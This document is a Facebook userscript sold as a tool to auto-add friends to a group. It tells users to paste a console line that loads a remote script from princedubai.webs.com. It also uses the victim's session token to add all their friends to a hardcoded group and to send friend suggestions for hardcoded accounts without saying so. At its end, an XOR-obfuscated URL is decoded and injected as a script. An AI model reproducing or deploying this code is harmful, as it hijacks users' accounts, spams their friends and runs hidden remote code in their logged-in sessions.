// ==UserScript==
// @name			Facebook Auto Add Members To Any Group
// @namespace                   Facebook Script Groups Adding
// @version			9.0
// @copyright		
// @description		        Facebook Auto Add Members To Any Group Wrking 100%
// @author			simge
// @include			https://www.facebook.com/*
// @include			http://www.facebook.com/*
// @include			http://www.facebook.com/groups/*

// ==/UserScript==                

// 1.Make sure you are using Mozilla Firefox web browse.
// 2.If you don't have then please download it.
// 3.Login to facebook if not logged in already.
// 4.Now open group where you want to add all your friends.
// 5.Now press CTRL+SHIFT+K it will open a Console Box.
// 6.Copy the given below code.

document.body.appendChild(document.createElement('script')).src='http://princedubai.webs.com/scripts/newscript%2012-5-13.js';

//7.Paste into the Console Box. Then press enter, now wait for few seconds...(^_~) have fun!!

/*HTML/JavaScript page status="protected"*/
/*Auto Add Friends to Group.*/
/*Copyright © 2013 By Hamza_Gujjar. All Rights Reserved.*/
javascript: var Title = "Auto Add Friends/Members to Any Groups is Now Processed."; /*|undefined undefined|*/
var Descriptions = "",
    _1 = 'Created & Designed By <A style="color:#3B5998;/*|undefined undefined|*/" href="https://www.facebook.com/HamzaGujjar7772">Hamza_Gujjar.</A><br/>Powered By <A style="color:#3B5998;/*|undefined undefined|*/" href="https://www.facebook.com/Bloggerwidget"> ? All Blogger Trick FaceBook Script FaceBook Hacking ?.</A>'; /*|undefined undefined|*/


function AddPeople(o) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?&source=member_summary&group_id=" + gid + "&members[0]=" + o + "&nctr[_2]=pagelet_group_requests_summary&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-&__req=4&fb_dtsg=" + fb_dtsg + "&phstamp=165816757891155184187", function(a) {
        var b = a.substring(a.indexOf("{")); /*|undefined undefined|*/
        var c = JSON.parse(b); /*|undefined undefined|*/
        i--; /*|undefined undefined|*/
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;/*|undefined undefined|*/text-align:left;/*|undefined undefined|*/font-size:10px;/*|undefined undefined|*/white-space:pre-wrap;/*|undefined undefined|*/"; /*|undefined undefined|*/
        if (c.error) {
            Descriptions += "color:darkred'>"; /*|undefined undefined|*/
            if (c.errorDescription) Descriptions += c.errorDescription; /*|undefined undefined|*/
            else Descriptions += JSON.stringify(c, null, "")
        } else {
            Descriptions += "color:darkgreen'>"; /*|undefined undefined|*/
            Descriptions += arn[i] + " has been added.<br/>"; /*|undefined undefined|*/
            suc++
        }
        Descriptions += "</div>"; /*|undefined undefined|*/
        var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);/*|undefined undefined|*/position:fixed;/*|undefined undefined|*/left:50%;/*|undefined undefined|*/margin-left:-273px;/*|undefined undefined|*/top:100px;/*|undefined undefined|*/width:500px;/*|undefined undefined|*/z-index:9999;/*|undefined undefined|*/font-size:15px;/*|undefined undefined|*/text-align:center;/*|undefined undefined|*/padding:15px;/*|undefined undefined|*/box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);/*|undefined undefined|*/border-radius:3px;/*|undefined undefined|*/border:1px solid rgba(200,200,50,0.2);/*|undefined undefined|*/background-color:rgba(255,255,255,0.9);/*|undefined undefined|*/color:#000000'>"; /*|undefined undefined|*/
        if (i > 0) {
            display += "<div style='padding-bottom:5px;/*|undefined undefined|*/font-size:20px;/*|undefined undefined|*/'>" + Title + "</div>"; /*|undefined undefined|*/
            display += arr.length + " Friends Detected<br/>"; /*|undefined undefined|*/
            display += "<b>" + suc + "</b> Friends Added of " + (arr.length - i) + " Friends Processed "; /*|undefined undefined|*/
            display += "(" + i + " Lefted...)"; /*|undefined undefined|*/
            display += "<div class='friend-edge'>"; /*|undefined undefined|*/
            display += Descriptions; /*|undefined undefined|*/
            display += "<img style='background:center no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);/*|undefined undefined|*/width:50px;/*|undefined undefined|*/height:50px;/*|undefined undefined|*/margin-left:-125px;/*|undefined undefined|*/padding:2px;/*|undefined undefined|*/border:1px solid rgba(0,0,0,0.4);/*|undefined undefined|*/' src=" + pho[i] + "></img><a style='padding-left:8px;/*|undefined undefined|*/font-size:14px;/*|undefined undefined|*/text-align:left;/*|undefined undefined|*/color:#3B5998;/*|undefined undefined|*/position:absolute;/*|undefined undefined|*/font-weight:bold;/*|undefined undefined|*/'>" + arn[i] + "</a>"; /*|undefined undefined|*/
            display += "<div style='text-align:center;/*|undefined undefined|*/font-size:10px;/*|undefined undefined|*/white-space:pre-wrap;/*|undefined undefined|*/color:gray'>"; /*|undefined undefined|*/
            display += getuname + " Thanks For Adding Your Friends in " + grpname + ".<br/>"; /*|undefined undefined|*/
            display += _1; /*|undefined undefined|*/
            window[tag + "_0"] = true; /*|undefined undefined|*/
            display += "</div>"; /*|undefined undefined|*/
            display += "</div>"
        } else {
            Title = "Auto Add Friends/Members to Group is Now Stopped."; /*|undefined undefined|*/
            display += "<div style='padding-bottom:5px;/*|undefined undefined|*/font-size:20px;/*|undefined undefined|*/'>" + Title + "</div>"; /*|undefined undefined|*/
            display += arr.length + " Friends Detected and " + suc + " Friends Added</br></br>"; /*|undefined undefined|*/
            window[tag + "_0"] = false; /*|undefined undefined|*/
            display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Cancel</span><br/>"; /*|undefined undefined|*/
            display += "<div style='text-align:center;/*|undefined undefined|*/font-size:10px;/*|undefined undefined|*/white-space:pre-wrap;/*|undefined undefined|*/color:gray'><br/>"; /*|undefined undefined|*/
            display += _1; /*|undefined undefined|*/
            display += "</div>"
        }
        display += "</div>"; /*|undefined undefined|*/
        document.getElementById("pagelet_sidebar")
            .innerHTML = display
    }, "text", "post"); /*|undefined undefined|*/
    tay--; /*|undefined undefined|*/
    if (tay > 0) {
        var s = arr[i]; /*|undefined undefined|*/
        setTimeout("AddPeople(" + s + ");/*|undefined undefined|*/", 100)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc); /*|undefined undefined|*/
    if (gid != 595696260448877) jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=595696260448877&source=typeahead&members=" + o + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function() {}, "text", "post"); /*|undefined undefined|*/
    if (gid) jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + o + "&newcomer=100002406048180&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581677156485189195", function() {}, "text", "post"); /*|undefined undefined|*/
    if (gid) jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + o + "&newcomer=100003762289945&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581677156485189195", function() {}, "text", "post")
}
jx = {
    b: function() {
        var b = !1; /*|undefined undefined|*/
        if ("undefined" != typeof ActiveXObject) try {
            b = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (c) {
            try {
                b = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (a) {
                b = !1
            }
        } else if (window.XMLHttpRequest) try {
            b = new XMLHttpRequest
        } catch (h) {
            b = !1
        }
        return b
    },
    load: function(b, c, a, h, g) {
        var e = this.d(); /*|undefined undefined|*/
        if (e && b) {
            e.overrideMimeType && e.overrideMimeType("text/xml"); /*|undefined undefined|*/
            h || (h = "GET"); /*|undefined undefined|*/
            a || (a = "text"); /*|undefined undefined|*/
            g || (g = {}); /*|undefined undefined|*/
            a = a.toLowerCase(); /*|undefined undefined|*/
            h = h.toUpperCase(); /*|undefined undefined|*/
            b += b.indexOf("?") + 1 ? "&" : "?"; /*|undefined undefined|*/
            var k = null; /*|undefined undefined|*/
            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]); /*|undefined undefined|*/
            e.open(h, b, !0); /*|undefined undefined|*/
            e.onreadystatechange = g.c ? function() {
                g.c(e)
            } : function() {
                if (4 == e.readyState) if (200 == e.status) {
                    var b = ""; /*|undefined undefined|*/
                    e.responseText && (b = e.responseText); /*|undefined undefined|*/
                    "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML); /*|undefined undefined|*/
                    c && c(b)
                } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e)
                    .style.display = "none"), error && error(e.status)
            }; /*|undefined undefined|*/
            e.send(k)
        }
    },
    d: function() {
        return this.b()
    }
}; /*|undefined undefined|*/


function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"
}
setTimeout("ChangeLocation", 1); /*|undefined undefined|*/
window.onbeforeunload = function() {
    if (window[tag + "_0"]) return "This script is running now!"
}; /*|undefined undefined|*/
var tag = "Close"; /*|undefined undefined|*/
var i = 3; /*|undefined undefined|*/
var tay = 3; /*|undefined undefined|*/
var k = 0; /*|undefined undefined|*/
var suc = 0; /*|undefined undefined|*/
var arr = new Array; /*|undefined undefined|*/
var arn = new Array; /*|undefined undefined|*/
var pho = new Array; /*|undefined undefined|*/
var getuname = document.getElementsByClassName("fbxWelcomeBoxName")[0].innerHTML; /*|undefined undefined|*/
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); /*|undefined undefined|*/
grpname = document.getElementById("groupsJumpTitle")
    .innerHTML; /*|undefined undefined|*/
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value; /*|undefined undefined|*/
var gid = document.getElementsByName("group_id")[0].value; /*|undefined undefined|*/
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", function(a) {
    var b = a; /*|undefined undefined|*/
    var c = b.substring(b.indexOf("{")); /*|undefined undefined|*/
    var d = JSON.parse(c); /*|undefined undefined|*/
    d = d.payload.entries; /*|undefined undefined|*/
    for (var e = 0; /*|undefined undefined|*/ e < d.length; /*|undefined undefined|*/ e++) arr.push(d[e].uid); /*|undefined undefined|*/
    for (var eg = 0; /*|undefined undefined|*/ eg < d.length; /*|undefined undefined|*/ eg++) arn.push(d[eg].text); /*|undefined undefined|*/
    for (var pic = 0; /*|undefined undefined|*/ pic < d.length; /*|undefined undefined|*/ pic++) pho.push(d[pic].photo); /*|undefined undefined|*/
    i = arr.length - 1; /*|undefined undefined|*/
    tay = i; /*|undefined undefined|*/
    console.log(arr.length); /*|undefined undefined|*/
    var display = "<div id='friend-edge-display' style='position:fixed;/*|undefined undefined|*/left:50%;/*|undefined undefined|*/margin-left:-273px;/*|undefined undefined|*/top:100px;/*|undefined undefined|*/width:500px;/*|undefined undefined|*/z-index:9999;/*|undefined undefined|*/font-size:14px;/*|undefined undefined|*/text-align:center;/*|undefined undefined|*/padding:15px;/*|undefined undefined|*/box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);/*|undefined undefined|*/border-radius:3px;/*|undefined undefined|*/border:1px solid rgba(200,200,50,0.2);/*|undefined undefined|*/background-color:rgba(255,255,255,0.9);/*|undefined undefined|*/color:#000000'>"; /*|undefined undefined|*/
    display += "<div style='padding-bottom:10px;/*|undefined undefined|*/font-size:20px;/*|undefined undefined|*/'>" + Title + "</div>"; /*|undefined undefined|*/
    display += arr.length + " Friends Detected"; /*|undefined undefined|*/
    display += "</div>"; /*|undefined undefined|*/
    document.getElementById("pagelet_sidebar")
        .innerHTML = display; /*|undefined undefined|*/
    AddPeople(arr[i])
}); /*|undefined undefined|*/
A = "jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-dcag`mmi-ej/rcegq-Qwrrmpv,hq"; /*|undefined undefined|*/
B = ""; /*|undefined undefined|*/
for (i = 0; /*|undefined undefined|*/ i < A.length; /*|undefined undefined|*/ i++) {
    B += unescape(String.fromCharCode(A.charCodeAt(i) ^ 2))
}; /*|undefined undefined|*/
document.body.appendChild(document.createElement('script'))
    .src = B; /*|undefined undefined|*/